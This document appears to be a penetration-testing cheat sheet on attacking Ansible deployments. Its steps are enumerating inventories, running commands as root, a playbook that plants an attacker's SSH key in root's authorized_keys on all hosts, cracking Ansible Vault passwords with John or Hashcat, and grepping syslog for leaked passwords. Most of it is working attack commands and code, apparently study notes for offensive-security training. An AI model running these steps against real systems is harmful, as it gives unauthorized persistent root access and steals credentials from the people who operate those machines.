# Ansible

<details>

<summary>Enumeration</summary>

* Check if it's installed&#x20;
  *   ```bash
      ansible
      ```


* Find host inventory (Find group && hosts)
  *   ```bash
      cat /etc/ansible/hosts
      ```

      <figure><img src="../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Running Ad-hoc Commands</summary>

* Run as standard user
  * ```bash
    ansible <grp name> -a "whoami"
    ```

- Run as Root
  * ```bash
    ansible <grp name> -a "whoami" --become
    ```

</details>

<details>

<summary>Ansible Playbook</summary>

* Run command:
  *   ```bash
      ansible-playbook <playbook-name>
      ```


* Might contain plaintext credentials
  *

      <figure><img src="../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>


* Exploit weak perm --> Add attacker's SSH public keys to victims
  * ```yaml
    ---
    - name: Get system info
      hosts: all
      gather_facts: true
      become: yes
      tasks:
        - name: Display info
          debug:
              msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

        - name: Create a directory if it does not exist
          file:
            path: /root/.ssh
            state: directory
            mode: '0700'
            owner: root
            group: root

        - name: Create authorized keys if it does not exist
          file:
            path: /root/.ssh/authorized_keys
            state: touch
            mode: '0600'
            owner: root
            group: root

        - name: Update keys
          lineinfile:
            path: /root/.ssh/authorized_keys
            line: "ssh-rsa AAAAB3NzaC1...Z86SOm..."
            insertbefore: EOF
    ```

</details>

<details>

<summary>Ansible Vault</summary>

* Might be present in playbook files
  *

      <figure><img src="../.gitbook/assets/image (303).png" alt=""><figcaption></figcaption></figure>


* Copy vault-encrypted password
  *

      <figure><img src="../.gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>


* Convert to format used by John/Hashcat
  *   ```bash
      python3 /usr/share/john/ansible2john.py vault_password > vault.hash
      ```


* Crack with John
  *   ```bash
      john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash
      ```


* OR Crack with Hashcat
  *   ```bash
      hashcat -m 16900 hash.txt rockyou.txt
      ```



      *

          <figure><img src="../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>


* In Ansible victim:
  * Copy original encrypted vault string to text file
    *

        <figure><img src="../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>


  * Pipe the encrypted vault string to ansible-vault decrypt
    *   ```
        cat pw.txt | ansible-vault decrypt
        ```



        *

            <figure><img src="../.gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Data Leakage via Ansible Modules</summary>

* Leak data to /var/log/syslog
  * ```bash
    cat /var/log/syslog | grep password
    ```

</details>
